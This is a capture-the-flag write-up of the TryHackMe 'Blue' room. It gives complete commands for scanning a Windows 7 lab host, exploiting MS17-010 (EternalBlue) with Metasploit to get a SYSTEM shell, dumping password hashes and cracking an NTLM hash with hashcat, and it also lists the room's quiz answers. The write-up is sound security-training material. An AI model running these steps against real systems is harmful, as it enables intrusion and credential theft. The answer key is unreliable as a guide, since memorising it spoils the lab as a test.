---
room: Blue
url: https://tryhackme.com/room/blue
category: windows
difficulty: Easy
os: Windows
tags: [smb, eternalblue, ms17-010, hashcat]
status: complete
started: 2026-09-09
completed: 2026-09-09
---

# Blue

> A Windows 7 host exposed to EternalBlue (MS17-010). SMB on 445 is unpatched,
> the Metasploit module lands a SYSTEM shell directly, and the room finishes by
> dumping and cracking a local user's NTLM hash. Pure "exploit the known CVE"
> box, useful for practising the SMB attack workflow end to end.

| | |
|---|---|
| **Room** | [Blue](https://tryhackme.com/room/blue) |
| **Difficulty** | Easy |
| **Target OS** | Windows 7 |
| **Attack path** | SMB recon -> MS17-010 (EternalBlue) -> SYSTEM -> hashdump + crack |

---

## 1. Recon

### Port scan

```bash
export IP=10.10.10.10
nmap -sC -sV -p- --min-rate 5000 -oN nmap/initial.txt $IP
```

| Port | Service | Version | Notes |
|---|---|---|---|
| 135/tcp | msrpc | Microsoft Windows RPC | |
| 139/tcp | netbios-ssn | | |
| 445/tcp | microsoft-ds | Windows 7 Professional SMB | primary target |
| 3389/tcp | ms-wbt-server | RDP | |

**What stood out:** an old Windows 7 box with SMB open. That combination screams
MS17-010, so check it before anything else.

### Confirm the vulnerability

```bash
nmap -p445 --script smb-vuln-ms17-010 -oN nmap/ms17-010.txt $IP
```

The script reports `VULNERABLE: Remote Code Execution vulnerability in Microsoft
SMBv1 servers (ms17-010)`. Foothold path confirmed.

---

## 2. Foothold

**Vulnerability:** MS17-010 / EternalBlue. A flaw in how SMBv1 handles specially
crafted packets allows remote code execution as `NT AUTHORITY\SYSTEM`.

**Exploitation:**

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST tun0
run
```

The exploit lands a shell as SYSTEM immediately (no privesc needed on this box).

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Convert to a shell and background it

The room asks you to background the Meterpreter session and upgrade to a full
shell before dumping hashes.

```
meterpreter > background
msf > sessions -u 1        # upgrade shell session to meterpreter if needed
```

---

## 3. Post-exploitation: dump and crack hashes

Already SYSTEM, so no escalation. The task is credential looting.

```
meterpreter > hashdump
Administrator:500:aad3b435...:31d6cfe0...:::
Jon:1000:aad3b435...:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Crack Jon's NTLM hash offline:

```bash
echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > jon.hash
hashcat -m 1000 jon.hash /usr/share/wordlists/rockyou.txt
```

`rockyou.txt` recovers the password in seconds.

---

## 4. Flags

Three flags are hidden on the filesystem. Search from the drive root:

```
meterpreter > search -f flag*.txt
```

| Flag | Location |
|---|---|
| flag1 | `C:\` |
| flag2 | in the config/registry-related directory |
| flag3 | in a user's documents/appdata path |

Values are left out on purpose - read them off your own box.

---

## 5. Room questions

**Task 2 - Recon**

1. How many ports are open with a port number under 1000? -> `3`
2. What is this machine vulnerable to? -> `ms17-010`

**Task 3 - Gain Access**

1. Exploit module used -> `exploit/windows/smb/ms17_010_eternalblue`
2. Show options / set the target -> `RHOSTS`

**Task 4 - Escalate**

1. Meterpreter command to convert a shell session -> `sessions -u`
2. Process migration is done with -> `migrate`

**Task 5 - Cracking**

1. User whose hash is not the default -> `Jon`
2. Cracked password -> recover with hashcat (`-m 1000`)

**Task 6 - Find flags**

1. flag1 / flag2 / flag3 -> found via `search -f flag*.txt`

---

## 6. Lessons learned

- An old Windows version plus SMB/445 is worth an MS17-010 check before any
  broader enumeration - it is often the whole box.
- `hashdump` needs SYSTEM; EternalBlue gives that for free, so no privesc step.
- NTLM is hashcat mode `1000`. The empty `31d6cfe0...` hash means a blank
  password - skip it.

## 7. References

- MS17-010 (EternalBlue): https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010
- Hashcat example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
